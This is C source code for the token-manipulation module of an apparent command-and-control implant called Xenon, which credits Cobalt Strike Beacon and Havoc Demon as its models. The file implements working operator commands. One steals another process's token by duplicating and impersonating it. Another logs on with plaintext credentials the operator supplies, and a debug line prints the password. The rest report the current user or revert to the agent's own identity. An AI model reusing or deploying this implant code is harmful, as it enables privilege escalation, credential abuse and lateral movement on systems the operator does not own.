/*
 * Token identity specific functions and commands
*/
#include "Tasks/Token.h"

#include "Xenon.h"
#include "Parser.h"
#include "Identity.h"



#ifdef INCLUDE_CMD_GETUID

/**
 * @brief Get current thread token's GUID.
 * 
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c#L25
 * @param [in] hToken Handle to an identity token.
 * @param [out] uidString Char Buffer to put the UID into.
 * @param [in] size Size of buffer.
 * @return DWORD
 */
DWORD TokenGetUidInternal(_In_ HANDLE hToken, _Out_ char* uidString, _In_ int size)
{
    DWORD Status = 0;   
	
    char userInfo[0x200];
	if (!IdentityGetUserInfo(hToken, userInfo, size))
	{
        Status = GetLastError();
        goto end;
	}

    snprintf(uidString, size, IdentityIsAdmin() ? "%s (admin)" : "%s", userInfo);
    uidString[size - 1] = 0;

end:

    return Status;
}


/**
 * @brief Get current user's UID.
 * 
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c 
 * @return VOID
 */
VOID TokenGetUid(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    HANDLE hToken;
    DWORD status;
    char uidString[0x400];

    PPackage data = PackageInit(0, FALSE);
    
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken) || OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{	
        status = TokenGetUidInternal(hToken, uidString, sizeof(uidString));
        if ( status != 0 )
        {
            _err("Failed to get user info. ERROR : %d", status);
            PackageError(taskUuid, status);
            goto end;
        }
        
        PackageAddString(data, uidString, FALSE);
	}
    else if (gIdentityToken)
	{
        _dbg("Temporarily reverting token to check UID...");
		IdentityAgentRevertToken();
		TokenGetUidInternal(gIdentityToken, uidString, sizeof(uidString));
		IdentityImpersonateToken();
	} 
    else
	{
        DWORD error = GetLastError();
		_err("Failed to open token. ERROR : %d", error);
        PackageError(taskUuid, error);
        goto end;
	}

    // Success
    PackageComplete(taskUuid, data);

end:
    PackageDestroy(data);
    if (hToken) CloseHandle(hToken);
}

#endif  //INCLUDE_CMD_GETUID


#ifdef INCLUDE_CMD_STEAL_TOKEN
/**
 * @brief Steal a process's identity token.
 * 
 * @ref https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/identity.c#L65
 * @return VOID
 */
VOID TokenSteal(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);

    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    UINT32 pid = ParserGetInt32(arguments);

    _dbg("Trying to steal token from pid : %d", pid);

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (!hProcess)
	{
		DWORD error = GetLastError();
		_err("Could not open process %d ERROR : %d", pid, error);
		PackageError(taskUuid, error);
		return;
	}

	HANDLE hToken;
	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
	{
        DWORD error = GetLastError();
		_err("Could not open process token %d ERROR : %d", error);
		PackageError(taskUuid, error);
		return;
	}

	IdentityAgentRevertToken();

	if (!ImpersonateLoggedOnUser(hToken))
	{
		DWORD error = GetLastError();
		_err("Could impersonate logged on user. ERROR : %d", error);
		PackageError(taskUuid, error);
		return;
	}

	if(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken))
	{
		DWORD error = GetLastError();
		_err("Could not duplicate token. ERROR : %d", error);
		PackageError(taskUuid, error);
		return;
	}

	if (!ImpersonateLoggedOnUser(gIdentityToken))
	{
		DWORD error = GetLastError();
		_err("Could not impersonate token. ERROR : %d", error);
		PackageError(taskUuid, error);
		return;
	}

	CloseHandle(hProcess);

	if (hToken) {
		CloseHandle(hToken);
	}

	char accountName[0x200];
	if (!IdentityGetUserInfo(gIdentityToken, accountName, sizeof(accountName)))
	{
        DWORD error = GetLastError();
		_err("Could not get identity for token. ERROR : %d", error);
		PackageError(taskUuid, error);
		return;
    }

    PPackage data = PackageInit(0, FALSE);
    PackageAddString(data, accountName, FALSE);
    
    // Success
    PackageComplete(taskUuid, data);

    // Cleanup
    PackageDestroy(data);
}
#endif  //INCLUDE_CMD_STEAL_TOKEN


#ifdef INCLUDE_CMD_MAKE_TOKEN
/**
 * @brief Create a new token logon session and impersonate with plaintext credentials.
 * 
 * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c
 * @return VOID
 */
VOID TokenMake(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
	// Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

	SIZE_T domainLen 	= 0;
	SIZE_T userLen 		= 0;
	SIZE_T passLen 		= 0;
	PCHAR  Domain 		= ParserGetString(arguments, &domainLen);
	PCHAR  User 		= ParserGetString(arguments, &userLen);
	PCHAR  Password  	= ParserGetString(arguments, &passLen);
	UINT32 LogonType	= ParserGetInt32(arguments);


    _dbg("TokenMake User: %s\\%s, Password: %s, LogonType: %d )", Domain, User, Password, LogonType);

    IdentityAgentRevertToken();

	/*
	 * LOGON32_LOGON_NEW_CREDENTIALS *only* applies credentials when interacting with remote resources.
	 * This allows you to:
	 * - Use a local account from another system to interact with it.
	 * - Authenticate to a system as a domain user when there’s no trust relationship with that domain.
	*/

    if (!LogonUserA(User, Domain, Password, LogonType, LogonType == LOGON32_LOGON_NEW_CREDENTIALS ? LOGON32_PROVIDER_WINNT50 : LOGON32_PROVIDER_DEFAULT, &gIdentityToken))
    {
        DWORD error = GetLastError();
		_err("Could not get identity for token. ERROR : %d", error);
		PackageError(taskUuid, error);
        return;
    }

	if (gIdentityToken != NULL)
	{
		if (!ImpersonateLoggedOnUser(gIdentityToken))
		{
			DWORD error = GetLastError();
			_err("Could not get identity for token. ERROR : %d", error);
			PackageError(taskUuid, error);
			return;
		}

		/*
		 * LOGON32_LOGON_NEW_CREDENTIALS clones the current user locally.
		 * LookupAccountSid / IdentityGetUserInfo then report the original
		 * account, not the credentials applied for remote access. Report
		 * DOMAIN\user from the args the operator supplied.
		 */
		char accountName[0x200];
		snprintf(accountName, sizeof(accountName), "%s\\%s", Domain, User);
		accountName[sizeof(accountName) - 1] = 0;

		PPackage data = PackageInit(0, FALSE);
		PackageAddString(data, accountName, FALSE);
		
		PackageComplete(taskUuid, data);

		PackageDestroy(data);
	}
}
#endif	//INCLUDE_CMD_MAKE_TOKEN


#ifdef INCLUDE_CMD_REV2SELF
VOID TokenRevert(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    IdentityAgentRevertToken();
    // Success?
    PackageComplete(taskUuid, NULL);
}
#endif  //INCLUDE_CMD_REV2SELF